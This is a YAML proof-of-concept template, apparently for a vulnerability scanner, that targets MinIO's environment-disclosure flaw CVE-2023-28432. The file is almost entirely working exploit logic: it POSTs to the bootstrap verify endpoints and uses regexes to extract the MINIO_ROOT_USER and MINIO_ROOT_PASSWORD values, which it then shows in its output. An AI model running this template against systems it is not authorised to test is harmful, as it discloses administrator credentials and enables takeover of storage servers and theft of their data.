name: poc-yaml-minio-env-disclosure-cve-2023-28432
tag: triple
transport: http
# set:
#   reverse: newReverse()
#   reverseURL: reverse.url
#   reverseDomain: reverse.domain

set:
    inputPath: request.url.path

payloads:
  continue: false
  payloads:
      path1:
          apipath: |
              "/minio/bootstrap/v1/verify"
      path2:
          apipath: |
              "/bootstrap/v1/verify"
      path3:
          apipath: |
              "/v1/verify"

rules:

  getVersion:
    request:
      cache: false
      method: GET
      path: ^/api/v1/check-version
      follow_redirects: false
      headers:
        User-Agent: >-
          Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Accept: '*/*'
    expression: response.status == 200 && response.body_string.contains("minio/minio:RELEASE")
    output:
      search:  '"\"minio/minio:RELEASE.(?P<releasedate>[\\d-]+)T(?P<releasetime>[\\d-]+)Z".bsubmatch(response.body)'
      releasedate: search["releasedate"]     # 如何判断 2021-08-31 <= releasedate < 2023-03-20
      releasetime: search["releasetime"]

  getMinioEnv:
    request:
      cache: false
      method: POST
      path: ^{{apipath}}
      follow_redirects: false
      headers:
        User-Agent: >-
          Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Accept: '*/*'
        Content-Type: 'application/x-www-form-urlencoded'
    expression: response.status == 200 && response.body_string.contains("MinioEndpoints")
    output:
      search: '"\"MINIO_ROOT_USER\":\"(?P<rootuser>.*?)\"".bsubmatch(response.body)'
      rootuser: search["rootuser"]
      search2: '"\"MINIO_ROOT_PASSWORD\":\"(?P<rootpass>.*?)\"".bsubmatch(response.body)'
      rootpass: search2["rootpass"]

  getMinioEnv2:
    request:
      cache: false
      method: POST
      path: ^{{inputPath}}{{apipath}}
      follow_redirects: false
      headers:
        User-Agent: >-
          Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
          (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Accept: '*/*'
        Content-Type: 'application/x-www-form-urlencoded'
    expression: response.status == 200 && response.body_string.contains("MinioEndpoints")
    output:
      search: '"\"MINIO_ROOT_USER\":\"(?P<rootuser>.*?)\"".bsubmatch(response.body)'
      rootuser: search["rootuser"]
      search2: '"\"MINIO_ROOT_PASSWORD\":\"(?P<rootpass>.*?)\"".bsubmatch(response.body)'
      rootpass: search2["rootpass"]

# expression: getVersion() && releasedate >= "2021-08-31" && releasedate < "2023-03-20"     # 可能不准
expression: getVersion() || getMinioEnv() || getMinioEnv2()
# expression: getMinioEnv()
detail:
  author: tripleBiu
  links:
    - https://xz.aliyun.com/t/12356
    - https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
  description: "RELEASE Version: {{releasedate}}T{{releasetime}}Z(may fake)    MINIO ROOT: {{rootuser}}  {{rootpass}}"
  product: minio
  # version: {{releasedate}}